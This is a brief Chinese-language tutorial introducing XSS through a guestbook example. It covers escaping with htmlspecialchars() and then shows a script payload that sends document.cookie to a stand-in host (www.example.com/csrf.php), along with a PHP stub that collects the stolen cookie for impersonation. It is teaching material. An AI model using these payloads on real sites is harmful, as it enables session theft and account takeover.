# 初探XSS

## XSS的原理

XSS（跨站脚本攻击）的攻击方式是：用户输入一段恶意文本，网页将它显示出来。

一般的思路是这样：找到一个XSS漏洞，提交恶意文本，然后把url发给其他用户，以便进行下一步操作。

一个很经典的例子：留言板。

假设网站没有对输入进行**过滤**，那么所有人都能看到留言。这时候我可以提交一个留言，写成这样：

```html
<script>alert('XSS!')</script>
```

那么当用户打开这个链接时，浏览器将会是这个情况：
![XSS](https://p1.bqimg.com/567571/7ef86c3451c28940.png)

如果有XSS漏洞，那就相当于我们可以利用`js`随意修改网页。例如把正常网页修改为诈骗网页、把广告嵌入页面、打开攻击者设好的链接、向服务器提交转账等请求。

## XSS的防范

将可能引发XSS的字符进行转义。例如`"`替换成`&quot;`。  
php提供了自带的函数：`htmlspecialchars()`。

## 进一步利用

在XSS漏洞的基础上，进行进一步利用。

假设之前的留言板给每个登录的用户一个cookie，叫做`user`。我们作为恶意攻击者，希望取得某个用户的cookie。

由于之前找到了留言板的XSS漏洞，我们可以构造这样一条留言：

```html
<script>window.location.href="http://www.example.com/csrf.php?cookie="+document.cookie</script>
```

这样，当用户访问留言板的时候，这段js代码会被执行，用户将跳转到`http://www.example.com/csrf.php?cookie={用户在留言板的cookie}`。

在`www.example.com/csrf.php`中这样写：
```
<?php 
    $usercookie=$_GET['cookie'];
    //TODO: 把cookie保存下来，进一步利用
?>
```

这样，我们的服务器就得到了用户在留言板的cookie。

由于拥有了cookie，我们可以**把自己伪装成这个用户**。

